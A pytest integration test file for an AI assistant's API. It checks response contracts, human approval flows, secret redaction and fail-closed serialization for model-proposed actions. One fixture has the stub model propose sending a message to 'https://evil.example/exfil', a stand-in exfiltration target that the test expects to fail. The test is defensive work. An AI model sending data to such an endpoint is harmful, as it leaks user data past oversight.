from __future__ import annotations

import copy
from collections.abc import Generator
from dataclasses import dataclass, field
from datetime import UTC, datetime, timedelta
from typing import Any

from fastapi.testclient import TestClient
import pytest
from testcontainers.postgres import PostgresContainer

import ariel.app as app_module
from ariel.app import ModelAdapter, create_app
from tests.integration.responses_helpers import responses_with_function_calls

FORBIDDEN_SURFACE_KEYS = {
    "action_attempts",
    "action_attempt",
    "capability_contract_hash",
    "payload_hash",
    "impact_level",
    "approval_required",
}

MESSAGE_RESPONSE_KEYS = {"ok", "session", "turn", "assistant"}
TIMELINE_RESPONSE_KEYS = {"ok", "session_id", "turns"}
APPROVAL_RESPONSE_KEYS = {"ok", "approval", "assistant"}
SESSION_KEYS = {"id", "is_active", "lifecycle_state", "created_at", "updated_at"}
ASSISTANT_KEYS = {"message", "sources", "silent"}
TURN_KEYS = {
    "id",
    "session_id",
    "user_message",
    "assistant_message",
    "status",
    "created_at",
    "updated_at",
    "events",
    "surface_action_lifecycle",
}
EVENT_KEYS = {"id", "turn_id", "sequence", "event_type", "payload", "created_at"}
EVENT_PAYLOAD_KEYS_BY_TYPE: dict[str, set[str]] = {
    "evt.turn.started": {"message", "discord"},
    "evt.turn.limit_reached": {"code", "message", "limit", "applied_limits"},
    "evt.assistant.emitted": {"message", "bounded_failure"},
    "evt.turn.failed": {"failure_reason", "error_code", "limit"},
    "evt.turn.completed": set(),
    "evt.model.started": {"provider", "model", "context", "attempt"},
    "evt.model.completed": {
        "provider",
        "model",
        "duration_ms",
        "usage",
        "provider_response_id",
        "attempt",
    },
    "evt.model.failed": {"provider", "model", "duration_ms", "failure_reason", "attempt"},
    "evt.memory.evidence_recorded": {
        "evidence_id",
        "source_turn_id",
        "source_session_id",
        "content_class",
        "trust_boundary",
    },
    "evt.memory.extraction_queued": {"task_id", "turn_id", "evidence_id"},
    "evt.action.proposed": {"action_attempt_id", "capability_id", "input", "taint"},
    "evt.action.policy_decided": {"action_attempt_id", "decision", "reason", "taint"},
    "evt.action.approval.requested": {
        "action_attempt_id",
        "approval_ref",
        "actor_id",
        "expires_at",
    },
    "evt.action.approval.expired": {"action_attempt_id", "approval_ref", "reason"},
    "evt.action.approval.denied": {"action_attempt_id", "approval_ref", "actor_id", "reason"},
    "evt.action.approval.approved": {"action_attempt_id", "approval_ref", "actor_id"},
    "evt.action.execution.started": {"action_attempt_id", "capability_id"},
    "evt.action.execution.succeeded": {"action_attempt_id", "output"},
    "evt.action.execution.failed": {"action_attempt_id", "error", "approval_ref"},
}
LIFECYCLE_ITEM_KEYS = {
    "action_attempt_id",
    "proposal_index",
    "proposal",
    "policy",
    "approval",
    "execution",
}


@dataclass
class ActionProposalAdapter:
    provider: str = "provider.s2-pr06"
    model: str = "model.s2-pr06-v1"
    proposals_by_message: dict[str, list[dict[str, Any]]] = field(default_factory=dict)

    def create_response(
        self,
        *,
        input_items: list[dict[str, Any]],
        tools: list[dict[str, Any]],
        user_message: str,
        history: list[dict[str, Any]],
        context_bundle: dict[str, Any],
    ) -> dict[str, Any]:
        del tools, history, context_bundle
        proposals = self.proposals_by_message.get(user_message, [])
        return responses_with_function_calls(
            input_items=input_items,
            assistant_text=f"assistant::{user_message}",
            proposals=copy.deepcopy(proposals),
            provider=self.provider,
            model=self.model,
            provider_response_id="resp_s2_pr06_123",
            input_tokens=23,
            output_tokens=17,
        )


@dataclass
class FrozenClock:
    current: datetime

    def now(self) -> datetime:
        return self.current

    def advance(self, *, seconds: int) -> None:
        self.current = self.current + timedelta(seconds=seconds)


@pytest.fixture(scope="session")
def postgres_url() -> Generator[str, None, None]:
    with PostgresContainer("postgres:16-alpine") as postgres:
        url = postgres.get_connection_url()
        yield url.replace("psycopg2", "psycopg")


def _build_client(postgres_url: str, adapter: ModelAdapter) -> TestClient:
    app = create_app(
        database_url=postgres_url,
        model_adapter=adapter,
        reset_database=True,
    )
    return TestClient(app)


def _session_id(client: TestClient) -> str:
    active = client.get("/v1/sessions/active")
    assert active.status_code == 200
    return active.json()["session"]["id"]


def _assert_keys(payload: dict[str, Any], expected_keys: set[str]) -> None:
    assert set(payload.keys()) == expected_keys


def _assert_no_forbidden_keys(value: Any) -> None:
    if isinstance(value, dict):
        keys = set(value.keys())
        assert keys.isdisjoint(FORBIDDEN_SURFACE_KEYS)
        for nested in value.values():
            _assert_no_forbidden_keys(nested)
        return
    if isinstance(value, list):
        for nested in value:
            _assert_no_forbidden_keys(nested)


def _assert_surface_lifecycle_item(item: dict[str, Any]) -> None:
    _assert_keys(item, LIFECYCLE_ITEM_KEYS)
    _assert_keys(item["proposal"], {"capability_id", "input_summary"})
    _assert_keys(item["policy"], {"decision", "reason"})
    _assert_keys(item["approval"], {"status", "reference", "reason", "expires_at", "decided_at"})
    _assert_keys(item["execution"], {"status", "output", "error"})
    _assert_no_forbidden_keys(item)


def _assert_surface_event_payload(event: dict[str, Any]) -> None:
    event_type = event["event_type"]
    assert event_type in EVENT_PAYLOAD_KEYS_BY_TYPE
    payload = event["payload"]
    assert isinstance(payload, dict)
    _assert_keys(payload, EVENT_PAYLOAD_KEYS_BY_TYPE[event_type])

    if event_type == "evt.turn.limit_reached":
        limit = payload["limit"]
        assert isinstance(limit, dict)
        _assert_keys(limit, {"budget", "unit", "limit", "measured"})
        applied_limits = payload["applied_limits"]
        assert isinstance(applied_limits, dict)
        _assert_keys(
            applied_limits,
            {
                "max_recent_turns",
                "max_context_tokens",
                "max_response_tokens",
                "max_model_attempts",
                "max_turn_wall_time_ms",
            },
        )
    elif event_type == "evt.assistant.emitted":
        bounded_failure = payload["bounded_failure"]
        if bounded_failure is not None:
            assert isinstance(bounded_failure, dict)
            _assert_keys(bounded_failure, {"code", "limit"})
            limit = bounded_failure["limit"]
            assert isinstance(limit, dict)
            _assert_keys(limit, {"budget", "unit", "limit", "measured"})
    elif event_type == "evt.turn.failed":
        limit = payload["limit"]
        if limit is not None:
            assert isinstance(limit, dict)
            _assert_keys(limit, {"budget", "unit", "limit", "measured"})
    elif event_type == "evt.model.started":
        context = payload["context"]
        assert isinstance(context, dict)
        _assert_keys(
            context,
            {"schema_version", "section_order", "policy_instruction_count", "recent_window"},
        )
        recent_window = context["recent_window"]
        assert isinstance(recent_window, dict)
        _assert_keys(
            recent_window,
            {"max_recent_turns", "included_turn_count", "omitted_turn_count", "included_turn_ids"},
        )
    elif event_type == "evt.model.completed":
        usage = payload["usage"]
        if usage is not None:
            assert isinstance(usage, dict)
            _assert_keys(usage, {"input_tokens", "output_tokens", "total_tokens"})
    elif event_type in {"evt.action.proposed", "evt.action.policy_decided"}:
        taint = payload["taint"]
        assert isinstance(taint, dict)
        _assert_keys(
            taint,
            {
                "influenced_by_untrusted_content",
                "provenance_status",
                "runtime_provenance",
                "model_declared_taint",
            },
        )
        runtime_provenance = taint["runtime_provenance"]
        assert isinstance(runtime_provenance, dict)
        _assert_keys(runtime_provenance, {"status", "evidence"})
        model_declared_taint = taint["model_declared_taint"]
        assert isinstance(model_declared_taint, dict)
        _assert_keys(model_declared_taint, {"status"})
        evidence = runtime_provenance["evidence"]
        assert isinstance(evidence, list)
        for item in evidence:
            assert isinstance(item, dict)
            _assert_keys(
                item, {"kind", "turn_id", "action_attempt_id", "capability_id", "impact_level"}
            )


def _assert_surface_turn_contract(turn_payload: dict[str, Any]) -> None:
    _assert_keys(turn_payload, TURN_KEYS)

    events = turn_payload["events"]
    assert isinstance(events, list)
    for event in events:
        assert isinstance(event, dict)
        _assert_keys(event, EVENT_KEYS)
        _assert_surface_event_payload(event)

    lifecycle = turn_payload["surface_action_lifecycle"]
    assert isinstance(lifecycle, list)
    for item in lifecycle:
        assert isinstance(item, dict)
        _assert_surface_lifecycle_item(item)

    _assert_no_forbidden_keys(turn_payload)


def _assert_surface_message_response(payload: dict[str, Any]) -> None:
    _assert_keys(payload, MESSAGE_RESPONSE_KEYS)
    assert payload["ok"] is True

    session = payload["session"]
    assert isinstance(session, dict)
    _assert_keys(session, SESSION_KEYS)

    assistant = payload["assistant"]
    assert isinstance(assistant, dict)
    _assert_keys(assistant, ASSISTANT_KEYS)
    assert isinstance(assistant["sources"], list)

    turn = payload["turn"]
    assert isinstance(turn, dict)
    _assert_surface_turn_contract(turn)

    _assert_no_forbidden_keys(payload)


def _assert_surface_timeline_response(payload: dict[str, Any]) -> None:
    _assert_keys(payload, TIMELINE_RESPONSE_KEYS)
    assert payload["ok"] is True
    assert isinstance(payload["session_id"], str)

    turns = payload["turns"]
    assert isinstance(turns, list)
    for turn_payload in turns:
        assert isinstance(turn_payload, dict)
        _assert_surface_turn_contract(turn_payload)

    _assert_no_forbidden_keys(payload)


def _assert_surface_approval_response(payload: dict[str, Any], *, expected_status: str) -> None:
    _assert_keys(payload, APPROVAL_RESPONSE_KEYS)
    assert payload["ok"] is True

    approval_payload = payload["approval"]
    assert isinstance(approval_payload, dict)
    _assert_keys(approval_payload, {"reference", "status", "reason", "expires_at", "decided_at"})
    assert isinstance(approval_payload["reference"], str)
    assert approval_payload["status"] == expected_status

    assistant = payload["assistant"]
    assert isinstance(assistant, dict)
    _assert_keys(assistant, ASSISTANT_KEYS)
    assert assistant["sources"] == []

    _assert_no_forbidden_keys(payload)


def _approval_ref(turn_payload: dict[str, Any], *, proposal_index: int = 1) -> str:
    lifecycle = turn_payload["surface_action_lifecycle"]
    item = lifecycle[proposal_index - 1]
    approval_payload = item["approval"]
    assert approval_payload["status"] == "pending"
    approval_ref = approval_payload.get("reference")
    assert isinstance(approval_ref, str)
    assert approval_ref.startswith("apr_")
    return approval_ref


def test_s2_pr06_contracts_for_inline_read_message_and_timeline(postgres_url: str) -> None:
    adapter = ActionProposalAdapter(
        proposals_by_message={
            "run read": [
                {
                    "capability_id": "cap.framework.read_echo",
                    "input": {"text": "my credential is sk-live-inline-secret"},
                }
            ]
        }
    )
    with _build_client(postgres_url, adapter) as client:
        session_id = _session_id(client)
        sent = client.post(f"/v1/sessions/{session_id}/message", json={"message": "run read"})
        assert sent.status_code == 200
        message_payload = sent.json()
        _assert_surface_message_response(message_payload)

        item = message_payload["turn"]["surface_action_lifecycle"][0]
        assert item["policy"]["decision"] == "allow_inline"
        assert item["approval"]["status"] == "not_requested"
        assert item["execution"]["status"] == "succeeded"

        timeline = client.get(f"/v1/sessions/{session_id}/events")
        assert timeline.status_code == 200
        timeline_payload = timeline.json()
        _assert_surface_timeline_response(timeline_payload)


def test_s2_pr06_contracts_for_denied_approval_flow(postgres_url: str) -> None:
    adapter = ActionProposalAdapter(
        proposals_by_message={
            "deny me": [{"capability_id": "cap.framework.write_note", "input": {"note": "nope"}}]
        }
    )
    with _build_client(postgres_url, adapter) as client:
        session_id = _session_id(client)
        sent = client.post(f"/v1/sessions/{session_id}/message", json={"message": "deny me"})
        assert sent.status_code == 200
        message_payload = sent.json()
        _assert_surface_message_response(message_payload)
        approval_ref = _approval_ref(message_payload["turn"])

        denied = client.post(
            "/v1/approvals",
            json={
                "approval_ref": approval_ref,
                "decision": "deny",
                "reason": "deny because api_key=sk-live-deny-secret",
            },
        )
        assert denied.status_code == 200
        denied_payload = denied.json()
        _assert_surface_approval_response(denied_payload, expected_status="denied")
        denied_reason = denied_payload["approval"]["reason"]
        assert isinstance(denied_reason, str)
        assert "[REDACTED]" in denied_reason
        assert "sk-live-deny-secret" not in denied_reason

        timeline = client.get(f"/v1/sessions/{session_id}/events")
        assert timeline.status_code == 200
        timeline_payload = timeline.json()
        _assert_surface_timeline_response(timeline_payload)
        item = timeline_payload["turns"][-1]["surface_action_lifecycle"][0]
        assert item["approval"]["status"] == "denied"
        assert item["execution"]["status"] == "not_executed"


def test_s2_pr06_contracts_for_expired_approval_flow(
    postgres_url: str,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    clock = FrozenClock(datetime(2026, 3, 1, 10, 0, tzinfo=UTC))
    monkeypatch.setattr("ariel.app._utcnow", clock.now)
    monkeypatch.setenv("ARIEL_APPROVAL_TTL_SECONDS", "5")

    adapter = ActionProposalAdapter(
        proposals_by_message={
            "expire me": [{"capability_id": "cap.framework.write_note", "input": {"note": "late"}}]
        }
    )
    with _build_client(postgres_url, adapter) as client:
        session_id = _session_id(client)
        sent = client.post(f"/v1/sessions/{session_id}/message", json={"message": "expire me"})
        assert sent.status_code == 200
        message_payload = sent.json()
        _assert_surface_message_response(message_payload)
        approval_ref = _approval_ref(message_payload["turn"])

        clock.advance(seconds=10)
        expired = client.post(
            "/v1/approvals",
            json={"approval_ref": approval_ref, "decision": "approve"},
        )
        assert expired.status_code == 409
        assert expired.json()["error"]["code"] == "E_APPROVAL_EXPIRED"

        timeline = client.get(f"/v1/sessions/{session_id}/events")
        assert timeline.status_code == 200
        timeline_payload = timeline.json()
        _assert_surface_timeline_response(timeline_payload)
        item = timeline_payload["turns"][-1]["surface_action_lifecycle"][0]
        assert item["approval"]["status"] == "expired"
        assert item["execution"]["status"] == "not_executed"


def test_s2_pr06_contracts_for_approved_execution_success_and_failure(postgres_url: str) -> None:
    adapter = ActionProposalAdapter(
        proposals_by_message={
            "approve success": [
                {
                    "capability_id": "cap.framework.external_notify",
                    "input": {
                        "destination": "https://api.framework.local/notify",
                        "message": "notify sk-live-approved-secret",
                    },
                }
            ],
            "approve fail": [
                {
                    "capability_id": "cap.framework.external_notify",
                    "input": {
                        "destination": "https://evil.example/exfil",
                        "message": "should fail",
                    },
                }
            ],
        }
    )
    with _build_client(postgres_url, adapter) as client:
        session_id = _session_id(client)

        sent_success = client.post(
            f"/v1/sessions/{session_id}/message",
            json={"message": "approve success"},
        )
        assert sent_success.status_code == 200
        success_message_payload = sent_success.json()
        _assert_surface_message_response(success_message_payload)
        success_ref = _approval_ref(success_message_payload["turn"])

        approved_success = client.post(
            "/v1/approvals",
            json={"approval_ref": success_ref, "decision": "approve"},
        )
        assert approved_success.status_code == 200
        _assert_surface_approval_response(approved_success.json(), expected_status="approved")

        sent_failure = client.post(
            f"/v1/sessions/{session_id}/message",
            json={"message": "approve fail"},
        )
        assert sent_failure.status_code == 200
        failure_message_payload = sent_failure.json()
        _assert_surface_message_response(failure_message_payload)
        failure_ref = _approval_ref(failure_message_payload["turn"])

        approved_failure = client.post(
            "/v1/approvals",
            json={"approval_ref": failure_ref, "decision": "approve"},
        )
        assert approved_failure.status_code == 200
        _assert_surface_approval_response(approved_failure.json(), expected_status="approved")

        timeline = client.get(f"/v1/sessions/{session_id}/events")
        assert timeline.status_code == 200
        timeline_payload = timeline.json()
        _assert_surface_timeline_response(timeline_payload)

        success_item = timeline_payload["turns"][-2]["surface_action_lifecycle"][0]
        assert success_item["execution"]["status"] == "succeeded"
        failure_item = timeline_payload["turns"][-1]["surface_action_lifecycle"][0]
        assert failure_item["execution"]["status"] == "failed"


def test_s2_pr06_contract_boundary_fails_closed_on_serializer_leaks(
    postgres_url: str,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    original_serialize_turn = app_module.serialize_turn

    def leaking_serialize_turn(*args: Any, **kwargs: Any) -> dict[str, Any]:
        payload = copy.deepcopy(original_serialize_turn(*args, **kwargs))
        payload["internal_runtime"] = {"payload_hash": "sha256:should-not-leak"}
        lifecycle = payload.get("surface_action_lifecycle")
        if isinstance(lifecycle, list) and lifecycle:
            first = lifecycle[0]
            if isinstance(first, dict):
                first["capability_contract_hash"] = "sha256:should-not-leak"
        events = payload.get("events")
        if isinstance(events, list) and events:
            first_event = events[0]
            if isinstance(first_event, dict):
                event_payload = first_event.get("payload")
                if isinstance(event_payload, dict):
                    event_payload["internal_trace_id"] = "trace-should-not-leak"
        return payload

    monkeypatch.setattr(app_module, "serialize_turn", leaking_serialize_turn)

    adapter = ActionProposalAdapter(
        proposals_by_message={
            "run read": [
                {
                    "capability_id": "cap.framework.read_echo",
                    "input": {"text": "boundary test"},
                }
            ]
        }
    )

    with _build_client(postgres_url, adapter) as client:
        session_id = _session_id(client)
        sent = client.post(f"/v1/sessions/{session_id}/message", json={"message": "run read"})
        assert sent.status_code == 500
        message_payload = sent.json()
        assert message_payload["ok"] is False
        assert message_payload["error"]["code"] == "E_RESPONSE_CONTRACT"
        details = message_payload["error"]["details"]
        assert isinstance(details, dict)
        assert "trace-should-not-leak" not in str(details)
        assert "sha256:should-not-leak" not in str(details)
        errors = details.get("errors")
        assert isinstance(errors, list)
        for error in errors:
            assert isinstance(error, dict)
            _assert_keys(error, {"loc", "type"})
